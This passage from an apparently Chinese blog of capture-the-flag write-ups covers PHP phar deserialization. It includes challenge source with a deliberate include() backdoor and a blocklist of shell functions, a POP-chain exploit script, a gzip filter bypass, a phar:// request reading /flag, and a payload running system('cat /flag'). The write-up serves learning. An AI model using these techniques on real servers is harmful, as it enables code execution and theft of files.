&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">result</span>&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">script</span> <span class="title">type</span>=&quot;<span class="title">text</span>/<span class="title">javascript</span>&quot;&gt;</span></span><br><span class="line"><span class="class">			$(&#x27;.<span class="title">search</span>&#x27;).<span class="title">click</span>(<span class="title">function</span>()</span>&#123;</span><br><span class="line">				$(<span class="string">&#x27;.result&#x27;</span>).<span class="title function_ invoke__">children</span>().<span class="title function_ invoke__">remove</span>();</span><br><span class="line">				$(<span class="string">&#x27;.result&#x27;</span>).<span class="title function_ invoke__">text</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">				<span class="keyword">var</span> content = $(<span class="string">&#x27;.box&#x27;</span>).<span class="title function_ invoke__">val</span>();</span><br><span class="line">				console.<span class="title function_ invoke__">log</span>(content);</span><br><span class="line">				$.<span class="title function_ invoke__">ajax</span>(&#123;</span><br><span class="line">					<span class="attr">type</span>: <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">					// <span class="attr">dataType</span>: <span class="string">&quot;text&quot;</span>,</span><br><span class="line">					<span class="attr">contentType</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">					<span class="attr">url</span>: <span class="string">&quot;./file.php&quot;</span>,</span><br><span class="line">					<span class="attr">cache</span>: <span class="literal">false</span>,</span><br><span class="line">					<span class="attr">data</span>: <span class="string">&quot;f=&quot;</span>+content,</span><br><span class="line">					<span class="attr">success</span>: function(result) &#123;</span><br><span class="line">						$(<span class="string">&#x27;.result&#x27;</span>).<span class="title function_ invoke__">append</span>(result);</span><br><span class="line">					&#125;,</span><br><span class="line">					error: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">						$(<span class="string">&#x27;.result&#x27;</span>).<span class="title function_ invoke__">text</span>(<span class="string">&#x27;error!!&#x27;</span>);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;);</span><br><span class="line">			&#125;)</span><br><span class="line">			$(<span class="string">&#x27;.find&#x27;</span>).<span class="title function_ invoke__">click</span>(function()&#123;</span><br><span class="line">				$(<span class="string">&#x27;.find&#x27;</span>).<span class="title function_ invoke__">addClass</span>(<span class="string">&#x27;active&#x27;</span>);</span><br><span class="line">				$(<span class="string">&#x27;.time&#x27;</span>).<span class="title function_ invoke__">addClass</span>(<span class="string">&#x27;sun&#x27;</span>);</span><br><span class="line">				$(<span class="string">&#x27;.back&#x27;</span>).<span class="title function_ invoke__">addClass</span>(<span class="string">&#x27;AM&#x27;</span>);</span><br><span class="line">				$(<span class="string">&#x27;.mountain&gt;div&#x27;</span>).<span class="title function_ invoke__">addClass</span>(<span class="string">&#x27;light&#x27;</span>);</span><br><span class="line">				$(<span class="string">&#x27;.cloud&#x27;</span>).<span class="title function_ invoke__">addClass</span>(<span class="string">&#x27;light&#x27;</span>);</span><br><span class="line">				$(<span class="string">&#x27;.star&#x27;</span>).<span class="title function_ invoke__">removeClass</span>(<span class="string">&#x27;light&#x27;</span>);</span><br><span class="line">				$(<span class="string">&#x27;.upload&#x27;</span>).<span class="title function_ invoke__">removeClass</span>(<span class="string">&#x27;active&#x27;</span>);</span><br><span class="line">				$(<span class="string">&#x27;.search-box&#x27;</span>).<span class="title function_ invoke__">removeClass</span>(<span class="string">&#x27;cover&#x27;</span>);</span><br><span class="line">				$(<span class="string">&#x27;#upload&#x27;</span>).<span class="title function_ invoke__">addClass</span>(<span class="string">&#x27;cover&#x27;</span>);</span><br><span class="line">				$(<span class="string">&#x27;.result&#x27;</span>).<span class="title function_ invoke__">text</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">			&#125;)</span><br><span class="line">			$(<span class="string">&#x27;.upload&#x27;</span>).<span class="title function_ invoke__">click</span>(function()&#123;</span><br><span class="line">				$(<span class="string">&#x27;.find&#x27;</span>).<span class="title function_ invoke__">removeClass</span>(<span class="string">&#x27;active&#x27;</span>);</span><br><span class="line">				$(<span class="string">&#x27;.upload&#x27;</span>).<span class="title function_ invoke__">addClass</span>(<span class="string">&#x27;active&#x27;</span>);</span><br><span class="line">				$(<span class="string">&#x27;.time&#x27;</span>).<span class="title function_ invoke__">removeClass</span>(<span class="string">&#x27;sun&#x27;</span>);</span><br><span class="line">				$(<span class="string">&#x27;.back&#x27;</span>).<span class="title function_ invoke__">removeClass</span>(<span class="string">&#x27;AM&#x27;</span>);</span><br><span class="line">				$(<span class="string">&#x27;.mountain&gt;div&#x27;</span>).<span class="title function_ invoke__">removeClass</span>(<span class="string">&#x27;light&#x27;</span>);</span><br><span class="line">				$(<span class="string">&#x27;.cloud&#x27;</span>).<span class="title function_ invoke__">removeClass</span>(<span class="string">&#x27;light&#x27;</span>);</span><br><span class="line">				$(<span class="string">&#x27;.star&#x27;</span>).<span class="title function_ invoke__">addClass</span>(<span class="string">&#x27;light&#x27;</span>);</span><br><span class="line">				$(<span class="string">&#x27;.search-box&#x27;</span>).<span class="title function_ invoke__">addClass</span>(<span class="string">&#x27;cover&#x27;</span>);</span><br><span class="line">				$(<span class="string">&#x27;#upload&#x27;</span>).<span class="title function_ invoke__">removeClass</span>(<span class="string">&#x27;cover&#x27;</span>);</span><br><span class="line">				$(<span class="string">&#x27;.result&#x27;</span>).<span class="title function_ invoke__">text</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">				$(<span class="string">&#x27;.box&#x27;</span>).<span class="title function_ invoke__">val</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">			&#125;)</span><br><span class="line">		&lt;/script&gt;</span><br><span class="line">	&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p><strong>class.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Upload</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$fname</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$fsize</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;f = <span class="variable">$_FILES</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">savefile</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">            <span class="variable">$fname</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;f[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="string">&quot;.png&quot;</span>; </span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;./upload/&#x27;</span>.<span class="variable">$fname</span>)) &#123; </span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;./upload/&#x27;</span>.<span class="variable">$fname</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$this</span>-&gt;f[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . <span class="variable">$fname</span>); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;upload success! :D&quot;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$cont</span> = <span class="variable language_">$this</span>-&gt;fname;</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable language_">$this</span>-&gt;fsize;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$cont</span>-&gt;<span class="variable">$size</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;this_is_upload&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">uploadfile</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">file_check</span>()) &#123; </span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">savefile</span>(); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">file_check</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="variable">$allowed_types</span> = <span class="keyword">array</span>(<span class="string">&quot;png&quot;</span>);</span><br><span class="line">            <span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable">$this</span>-&gt;f[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">            <span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>); </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$extension</span>)) &#123; </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;what are you uploaded? :0&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123; </span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>,<span class="variable">$allowed_types</span>)) &#123;</span><br><span class="line">                    <span class="variable">$filter</span> = <span class="string">&#x27;/&lt;\?php|php|exec|passthru|popen|proc_open|shell_exec|system|phpinfo|assert|chroot|getcwd|scandir|delete|rmdir|rename|chgrp|chmod|chown|copy|mkdir|file|file_get_contents|fputs|fwrite|dir/i&#x27;</span>;</span><br><span class="line">                    <span class="variable">$f</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;f[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$filter</span>,<span class="variable">$f</span>))&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&#x27;what are you doing!! :C&#x27;</span>;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">                &#125; </span><br><span class="line">                <span class="keyword">else</span> &#123; </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;png onlyyy! XP&#x27;</span>; </span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">                &#125; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$fname</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="variable">$fname</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|file:|php:|gopher|dict|\.\./i&#x27;</span>,<span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;illegal fname :P&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;source);</span><br><span class="line">                <span class="variable">$src</span> = <span class="string">&quot;data:jpg;base64,&quot;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;source));</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=<span class="subst">&#123;$src&#125;</span> /&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">ok</span>(<span class="variable">$name</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">end</span>(<span class="variable">$arguments</span>)==<span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">                <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">backdoor</span>(<span class="title function_ invoke__">end</span>(<span class="variable">$arguments</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">backdoor</span>(<span class="params"><span class="variable">$door</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="variable">$door</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacked!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;illegal fname XD&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;str=<span class="string">&quot;It&#x27;s works&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;str;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>upload.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$upload</span> = <span class="keyword">new</span> <span class="title class_">Upload</span>();</span><br><span class="line">    <span class="variable">$upload</span>-&gt;<span class="title function_ invoke__">uploadfile</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>file.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="variable">$show</span> = <span class="keyword">new</span> <span class="title class_">Show</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="variable">$show</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>逻辑链：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Test.__destruct -&gt; Upload.__toString -&gt; Show.__get -&gt; Show.__call -&gt; Show.backdoor()</span><br></pre></td></tr></table></figure>
<p>show()处可以触发phar反序列化，并且gzip压缩后能绕过对内容的检测</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Upload</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fsize</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$t</span>-&gt;str = <span class="keyword">new</span> <span class="title class_">Upload</span>();</span><br><span class="line"><span class="variable">$t</span>-&gt;str-&gt;fname = <span class="keyword">new</span> <span class="title class_">Show</span>(<span class="string">&#x27;suibian&#x27;</span>);</span><br><span class="line"><span class="variable">$t</span>-&gt;str-&gt;fsize = <span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;poc.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span> . <span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$t</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>压缩：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gzip</span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;poc.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    f = file.read()</span><br><span class="line"> </span><br><span class="line">newf = gzip.compress(f)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;poc.png&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(newf)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#对phar文件进行压缩</span></span><br></pre></td></tr></table></figure>
<p>然后上传文件，再看到：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">savefile</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">            <span class="variable">$fname</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;f[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="string">&quot;.png&quot;</span>; </span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;./upload/&#x27;</span>.<span class="variable">$fname</span>)) &#123; </span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;./upload/&#x27;</span>.<span class="variable">$fname</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$this</span>-&gt;f[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . <span class="variable">$fname</span>); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;upload success! :D&quot;</span>; </span><br><span class="line">        &#125; </span><br></pre></td></tr></table></figure>
<p>将上传后的文件名MD5加密，我们也可以用php来加密我们的文件名：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&quot;poc.png&quot;</span>);</span><br><span class="line"><span class="comment">//23f1a0f70f076b42b5b49f24ee28f696</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后访问<code>/file.php?f=phar://upload/23f1a0f70f076b42b5b49f24ee28f696.png&amp;_=1713073174353</code>即可</p>
<hr>
<h4 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h4><h5 id="NSSRound-4-SWPU-1zweb-NSSCTF"><a href="#NSSRound-4-SWPU-1zweb-NSSCTF" class="headerlink" title="NSSRound#4 SWPU]1zweb | NSSCTF"></a><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2484">NSSRound#4 SWPU]1zweb | NSSCTF</a></h5><p>POC:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoveNss</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ljt</span>=<span class="string">&quot;Misc&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dky</span>=<span class="string">&quot;Re&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">LoveNss</span>();</span><br><span class="line"> </span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//自定义的meta-data</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算,默认是SHA1</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>修复签名:(修改了类型数量)</p>
